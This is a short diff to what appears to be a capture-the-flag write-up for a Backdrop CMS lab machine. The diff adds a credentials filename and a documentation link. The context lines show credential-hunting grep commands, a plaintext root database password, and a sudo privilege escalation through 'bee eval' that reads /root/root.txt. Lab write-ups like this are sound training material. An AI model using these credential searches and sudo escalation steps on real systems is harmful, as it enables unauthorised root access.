@@ -43,7 +43,7 @@ grep -Ri 'admin' .
 grep -Ri '.htb'
 grep -Eroi "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}" .
 ```
-Found credentials:
+Found credentials (setting.php):
 ```
 $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
 ```
@@ -92,3 +92,5 @@ sudo -l
 cd /var/www/html
 sudo /usr/local/bin/bee --root eval "system('cat /root/root.txt');"
 ```
+
+[Bee doc](https://github.com/backdrop-contrib/bee/wiki/Usage#command-structure)
